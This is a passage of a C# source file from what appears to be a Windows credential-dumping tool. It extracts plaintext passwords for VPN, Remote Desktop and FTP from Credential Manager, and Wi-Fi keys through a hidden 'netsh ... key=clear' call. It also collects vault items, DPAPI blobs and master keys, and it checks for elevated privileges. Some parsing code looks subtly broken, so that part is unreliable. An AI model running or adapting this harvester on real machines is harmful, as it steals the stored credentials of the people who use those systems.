                            var password = ExtractPasswordFromWiFiProfile(profileXml);
                            if (!string.IsNullOrEmpty(password))
                            {
                                passwords.Add(new StoredPassword
                                {
                                    Application = "WiFi",
                                    Target = profile,
                                    Password = password,
                                    LastWritten = DateTime.Now
                                });
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError(ex, $"Error extracting WiFi password for profile: {profile}");
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting WiFi passwords");
            }

            return passwords;
        }

        private List<StoredPassword> ExtractVPNPasswords()
        {
            var passwords = new List<StoredPassword>();

            try
            {
                IntPtr credPtr;
                uint count;
                var filter = "*VPN*";

                if (NativeMethods.CredEnumerate(filter, 0, out count, out credPtr))
                {
                    var credentialPtrs = new IntPtr[count];
                    Marshal.Copy(credPtr, credentialPtrs, 0, (int)count);

                    foreach (var ptr in credentialPtrs)
                    {
                        var cred = Marshal.PtrToStructure<NativeMethods.CREDENTIAL>(ptr);
                        var password = new StoredPassword
                        {
                            Application = "VPN",
                            Target = Marshal.PtrToStringUni(cred.TargetName),
                            Username = Marshal.PtrToStringUni(cred.UserName),
                            LastWritten = DateTime.FromFileTime(cred.LastWritten)
                        };

                        if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero)
                        {
                            var passwordBytes = new byte[cred.CredentialBlobSize];
                            Marshal.Copy(cred.CredentialBlob, passwordBytes, 0, (int)cred.CredentialBlobSize);
                            password.Password = Encoding.Unicode.GetString(passwordBytes).TrimEnd('\0');
                        }

                        passwords.Add(password);
                    }

                    NativeMethods.CredFree(credPtr);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting VPN passwords");
            }

            return passwords;
        }

        private List<StoredPassword> ExtractRDPPasswords()
        {
            var passwords = new List<StoredPassword>();

            try
            {
                IntPtr credPtr;
                uint count;
                var filter = "TERMSRV*";

                if (NativeMethods.CredEnumerate(filter, 0, out count, out credPtr))
                {
                    var credentialPtrs = new IntPtr[count];
                    Marshal.Copy(credPtr, credentialPtrs, 0, (int)count);

                    foreach (var ptr in credentialPtrs)
                    {
                        var cred = Marshal.PtrToStructure<NativeMethods.CREDENTIAL>(ptr);
                        var password = new StoredPassword
                        {
                            Application = "Remote Desktop",
                            Target = Marshal.PtrToStringUni(cred.TargetName),
                            Username = Marshal.PtrToStringUni(cred.UserName),
                            LastWritten = DateTime.FromFileTime(cred.LastWritten)
                        };

                        if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero)
                        {
                            var passwordBytes = new byte[cred.CredentialBlobSize];
                            Marshal.Copy(cred.CredentialBlob, passwordBytes, 0, (int)cred.CredentialBlobSize);
                            password.Password = Encoding.Unicode.GetString(passwordBytes).TrimEnd('\0');
                        }

                        passwords.Add(password);
                    }

                    NativeMethods.CredFree(credPtr);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting RDP passwords");
            }

            return passwords;
        }

        private List<StoredPassword> ExtractFTPPasswords()
        {
            var passwords = new List<StoredPassword>();

            try
            {
                IntPtr credPtr;
                uint count;
                var filter = "ftp*";

                if (NativeMethods.CredEnumerate(filter, 0, out count, out credPtr))
                {
                    var credentialPtrs = new IntPtr[count];
                    Marshal.Copy(credPtr, credentialPtrs, 0, (int)count);

                    foreach (var ptr in credentialPtrs)
                    {
                        var cred = Marshal.PtrToStructure<NativeMethods.CREDENTIAL>(ptr);
                        var password = new StoredPassword
                        {
                            Application = "FTP",
                            Target = Marshal.PtrToStringUni(cred.TargetName),
                            Username = Marshal.PtrToStringUni(cred.UserName),
                            LastWritten = DateTime.FromFileTime(cred.LastWritten)
                        };

                        if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero)
                        {
                            var passwordBytes = new byte[cred.CredentialBlobSize];
                            Marshal.Copy(cred.CredentialBlob, passwordBytes, 0, (int)cred.CredentialBlobSize);
                            password.Password = Encoding.Unicode.GetString(passwordBytes).TrimEnd('\0');
                        }

                        passwords.Add(password);
                    }

                    NativeMethods.CredFree(credPtr);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting FTP passwords");
            }

            return passwords;
        }

        private string GetCredentialTypeName(uint type)
        {
            return type switch
            {
                CRED_TYPE_GENERIC => "Generic",
                CRED_TYPE_DOMAIN_PASSWORD => "Domain Password",
                CRED_TYPE_DOMAIN_CERTIFICATE => "Domain Certificate",
                CRED_TYPE_DOMAIN_VISIBLE_PASSWORD => "Domain Visible Password",
                CRED_TYPE_GENERIC_CERTIFICATE => "Generic Certificate",
                CRED_TYPE_DOMAIN_EXTENDED => "Domain Extended",
                _ => $"Unknown ({type})"
            };
        }

        private string GetPersistTypeName(uint persist)
        {
            return persist switch
            {
                CRED_PERSIST_SESSION => "Session",
                CRED_PERSIST_LOCAL_MACHINE => "Local Machine",
                CRED_PERSIST_ENTERPRISE => "Enterprise",
                _ => $"Unknown ({persist})"
            };
        }

        private bool IsUnicodeText(byte[] data)
        {
            if (data.Length < 2) return false;

            for (int i = 0; i < Math.Min(data.Length - 1, 100); i += 2)
            {
                if (data[i + 1] != 0) return false;
                if (data[i] == 0) return true;
            }

            return true;
        }

        private string ExtractApplicationName(string targetName)
        {
            if (string.IsNullOrEmpty(targetName)) return "Unknown";

            if (targetName.Contains("TERMSRV")) return "Remote Desktop";
            if (targetName.Contains("Microsoft_OC1")) return "Microsoft Office";
            if (targetName.Contains("VPN")) return "VPN Client";
            if (targetName.StartsWith("http")) return "Web Browser";
            if (targetName.StartsWith("ftp")) return "FTP Client";

            return "Generic Application";
        }

        private string ExtractDomainName(string userName)
        {
            if (string.IsNullOrEmpty(userName)) return null;

            var parts = userName.Split('\\', '@');
            if (parts.Length > 1)
            {
                return userName.Contains('@') ? parts[1] : parts[0];
            }

            return null;
        }

        private string ExtractAccountName(string userName)
        {
            if (string.IsNullOrEmpty(userName)) return userName;

            var parts = userName.Split('\\', '@');
            return userName.Contains('@') ? parts[0] : parts.Length > 1 ? parts[1] : parts[0];
        }

        private string ExtractCertificateThumbprint(byte[] certData)
        {
            try
            {
                if (certData.Length < 20) return "Unknown";

                var hash = System.Security.Cryptography.SHA1.HashData(certData);
                return BitConverter.ToString(hash).Replace("-", "");
            }
            catch
            {
                return "Unknown";
            }
        }

        private string ExtractProtocol(string url)
        {
            if (string.IsNullOrEmpty(url)) return "Unknown";

            var colonIndex = url.IndexOf("://");
            return colonIndex > 0 ? url.Substring(0, colonIndex).ToUpper() : "Unknown";
        }

        private string ExtractDomainFromUrl(string url)
        {
            if (string.IsNullOrEmpty(url)) return "Unknown";

            try
            {
                var uri = new Uri(url.StartsWith("http") ? url : "http://" + url);
                return uri.Host;
            }
            catch
            {
                return "Unknown";
            }
        }

        private string ExtractVaultElementData(NativeMethods.VAULT_ELEMENT_DATA element)
        {
            try
            {
                switch (element.Type)
                {
                    case 1:
                        return Marshal.PtrToStringUni(element.String);
                    case 2:
                        if (element.ByteArray != IntPtr.Zero)
                        {
                            var bytes = new byte[element.ByteArraySize];
                            Marshal.Copy(element.ByteArray, bytes, 0, (int)element.ByteArraySize);
                            return Convert.ToBase64String(bytes);
                        }
                        break;
                    case 3:
                        return Marshal.PtrToStringUni(element.ProtectedString);
                    case 4:
                        return element.Attribute.ToString();
                    case 5:
                        return element.Sid.ToString();
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error extracting vault element data");
            }

            return "Unknown";
        }

        private string ExtractMasterKeyGuid(byte[] data)
        {
            try
            {
                if (data.Length < 64) return "Unknown";

                var guidBytes = new byte[16];
                Array.Copy(data, 12, guidBytes, 0, 16);
                return new Guid(guidBytes).ToString();
            }
            catch
            {
                return "Unknown";
            }
        }

        private string ExtractDPAPIDescription(byte[] data)
        {
            try
            {
                if (data.Length < 32) return "Unknown";

                var descOffset = BitConverter.ToInt32(data, 28);
                var descLength = BitConverter.ToInt32(data, 32);

                if (descOffset > 0 && descLength > 0 && descOffset + descLength <= data.Length)
                {
                    var descBytes = new byte[descLength];
                    Array.Copy(data, descOffset, descBytes, 0, descLength);
                    return Encoding.Unicode.GetString(descBytes).TrimEnd('\0');
                }
            }
            catch
            {
            }

            return "Unknown";
        }

        private int ExtractMasterKeyVersion(byte[] data)
        {
            try
            {
                if (data.Length >= 4)
                {
                    return BitConverter.ToInt32(data, 0);
                }
            }
            catch
            {
            }

            return 0;
        }

        private string ExtractMasterKeyAlgorithm(byte[] data)
        {
            try
            {
                if (data.Length >= 12)
                {
                    var algId = BitConverter.ToInt32(data, 8);
                    return algId switch
                    {
                        0x6603 => "3DES",
                        0x6610 => "AES-128",
                        0x6620 => "AES-192",
                        0x6630 => "AES-256",
                        _ => $"Unknown ({algId:X})"
                    };
                }
            }
            catch
            {
            }

            return "Unknown";
        }

        private string ExtractPasswordFromWiFiProfile(string profileXml)
        {
            try
            {
                var keyMaterialStart = profileXml.IndexOf("<keyMaterial>");
                var keyMaterialEnd = profileXml.IndexOf("</keyMaterial>");

                if (keyMaterialStart > 0 && keyMaterialEnd > keyMaterialStart)
                {
                    keyMaterialStart += "<keyMaterial>".Length;
                    return profileXml.Substring(keyMaterialStart, keyMaterialEnd - keyMaterialStart);
                }
            }
            catch
            {
            }

            return null;
        }
    }

    public class CredentialStoreResult : BaseResult
    {
        public string ExecutionId { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime CompletionTime { get; set; }
        public TimeSpan Duration { get; set; }

        public bool IsElevated { get; set; }
        public bool HasBackupPrivilege { get; set; }
        public bool HasRestorePrivilege { get; set; }
        public bool HasSecurityPrivilege { get; set; }
        public bool CanProceed { get; set; }

        public bool CanAccessCredentialManager { get; set; }
        public bool CanAccessVault { get; set; }
        public bool CanAccessDPAPI { get; set; }

        public int TotalCredentialsFound { get; set; }
        public int WindowsCredentialsFound { get; set; }
        public int GenericCredentialsFound { get; set; }
        public int DomainCredentialsFound { get; set; }
        public int CertificateCredentialsFound { get; set; }
        public int WebCredentialsFound { get; set; }
        public int VaultCredentialsFound { get; set; }
        public int DPAPICredentialsFound { get; set; }
        public int MasterKeyCredentialsFound { get; set; }
        public int StoredPasswordsFound { get; set; }

        public List<WindowsCredential> WindowsCredentials { get; set; } = new List<WindowsCredential>();
        public List<GenericCredential> GenericCredentials { get; set; } = new List<GenericCredential>();
        public List<DomainCredential> DomainCredentials { get; set; } = new List<DomainCredential>();
        public List<CertificateCredential> CertificateCredentials { get; set; } = new List<CertificateCredential>();
        public List<WebCredential> WebCredentials { get; set; } = new List<WebCredential>();
        public List<VaultCredential> VaultCredentials { get; set; } = new List<VaultCredential>();
        public List<DPAPICredential> DPAPICredentials { get; set; } = new List<DPAPICredential>();
        public List<MasterKeyCredential> MasterKeyCredentials { get; set; } = new List<MasterKeyCredential>();
        public List<StoredPassword> StoredPasswords { get; set; } = new List<StoredPassword>();

        public List<string> ProcessingErrors { get; set; } = new List<string>();
        public Exception Exception { get; set; }
    }

    public class WindowsCredential
    {
        public string TargetName { get; set; }
        public string Type { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string Comment { get; set; }
        public DateTime LastWritten { get; set; }
        public string Persist { get; set; }
        public uint Flags { get; set; }
    }

    public class GenericCredential
    {
        public string TargetName { get; set; }
        public string UserName { get; set; }
        public string Comment { get; set; }
        public DateTime LastWritten { get; set; }
        public string ApplicationName { get; set; }
        public string Data { get; set; }
        public string DecodedData { get; set; }
    }

    public class DomainCredential
    {
        public string TargetName { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string DomainName { get; set; }
        public string AccountName { get; set; }
        public string Comment { get; set; }
        public DateTime LastWritten { get; set; }
        public bool IsVisible { get; set; }
    }

    public class CertificateCredential
    {
        public string TargetName { get; set; }
        public string UserName { get; set; }
        public string Comment { get; set; }
        public DateTime LastWritten { get; set; }
        public string CertificateType { get; set; }
        public string CertificateData { get; set; }
        public string CertificateThumbprint { get; set; }
    }

    public class WebCredential
    {
        public string Url { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string Comment { get; set; }
        public DateTime LastWritten { get; set; }
        public string Protocol { get; set; }
        public string Domain { get; set; }
    }

    public class VaultCredential
    {
        public string VaultId { get; set; }
        public string SchemaId { get; set; }
        public string FriendlyName { get; set; }
        public string Resource { get; set; }
        public string Identity { get; set; }
        public string Authenticator { get; set; }
        public DateTime LastModified { get; set; }
    }

    public class DPAPICredential
    {
        public string FilePath { get; set; }
        public long FileSize { get; set; }
        public DateTime CreationTime { get; set; }
        public DateTime LastWriteTime { get; set; }
        public string EncryptedData { get; set; }
        public string DecryptedData { get; set; }
        public bool IsDecrypted { get; set; }
        public string MasterKeyGuid { get; set; }
        public string Description { get; set; }
    }

    public class MasterKeyCredential
    {
        public string FilePath { get; set; }
        public string MasterKeyGuid { get; set; }
        public long FileSize { get; set; }
        public DateTime CreationTime { get; set; }
        public DateTime LastWriteTime { get; set; }
        public string EncryptedData { get; set; }
        public int Version { get; set; }
        public string Algorithm { get; set; }
    }

    public class StoredPassword
    {
        public string Source { get; set; }
        public string Application { get; set; }
        public string Target { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
        public DateTime LastWritten { get; set; }
    }

    internal static class NativeMethods
    {
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CredEnumerate(string filter, uint flags, out uint count, out IntPtr pCredentials);

        [DllImport("advapi32.dll")]
        public static extern bool CredFree(IntPtr buffer);

        [DllImport("vaultcli.dll")]
        public static extern int VaultEnumerateVaults(int dwFlags, out int pVaultCount, out IntPtr pVaultGuids);

        [DllImport("vaultcli.dll")]
        public static extern int VaultOpenVault(ref Guid vaultGuid, uint dwFlags, out IntPtr vaultHandle);

        [DllImport("vaultcli.dll")]
        public static extern int VaultCloseVault(ref IntPtr vaultHandle);

        [DllImport("vaultcli.dll")]
        public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, out int pItemCount, out IntPtr pItems);

        [DllImport("vaultcli.dll")]
        public static extern int VaultFree(IntPtr pMem);

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CryptProtectData(ref DATA_BLOB pDataIn, string szDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, uint dwFlags, ref DATA_BLOB pDataOut);

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, StringBuilder ppszDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, uint dwFlags, ref DATA_BLOB pDataOut);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LocalFree(IntPtr hMem);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct CREDENTIAL
        {
            public uint Flags;
            public uint Type;
            public IntPtr TargetName;
            public IntPtr Comment;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
            public uint CredentialBlobSize;
            public IntPtr CredentialBlob;
            public uint Persist;
            public uint AttributeCount;
            public IntPtr Attributes;
            public IntPtr TargetAlias;
            public IntPtr UserName;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DATA_BLOB
        {
            public uint cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct VAULT_ITEM
        {
            public Guid SchemaId;
            public IntPtr FriendlyName;
            public IntPtr Resource;
            public IntPtr Identity;
            public IntPtr Authenticator;
            public long LastModified;
            public uint dwFlags;
            public uint dwPropertiesCount;
            public IntPtr pProperties;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct VAULT_ELEMENT_DATA
        {
            public uint Type;
            public IntPtr String;
            public IntPtr ByteArray;
            public uint ByteArraySize;
            public IntPtr ProtectedString;
            public uint Attribute;
            public IntPtr Sid;
        }

        public static List<string> GetWiFiProfiles()
        {
            var profiles = new List<string>();
            try
            {
                var process = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = "wlan show profiles",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };

                process.Start();
                var output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                var lines = output.Split('\n');
                foreach (var line in lines)
                {
                    if (line.Contains("All User Profile") && line.Contains(":"))
                    {
                        var profileName = line.Split(':')[1].Trim();
                        if (!string.IsNullOrEmpty(profileName))
                        {
                            profiles.Add(profileName);
                        }
                    }
                }
            }
            catch
            {
            }
            return profiles;
        }

        public static string GetWiFiProfileXml(string profileName)
        {
            try
            {
                var process = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = $"wlan show profile name=\"{profileName}\" key=clear",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };

                process.Start();
                var output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                return output;
            }
            catch
            {
                return null;
            }
        }
    }
}